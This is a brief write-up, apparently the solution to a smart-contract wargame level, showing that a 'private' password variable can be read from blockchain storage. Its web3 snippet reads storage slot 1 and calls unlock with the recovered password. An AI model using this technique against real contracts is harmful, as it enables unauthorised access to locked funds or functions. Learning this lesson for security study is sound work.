## Overview
1. Even though the password variable is marked as private, we can still look at the storage data on the blockchain directly
2. So we'd get the password then call unlock with the password

## Code
```
// locked is in slot 0 and therefore password is in slot 1
const pw = await web3.eth.getStorageAt(contract.address, 1)

await contract.unlock(pw)

// Check to see if contract is still locked
await contract.locked() 
```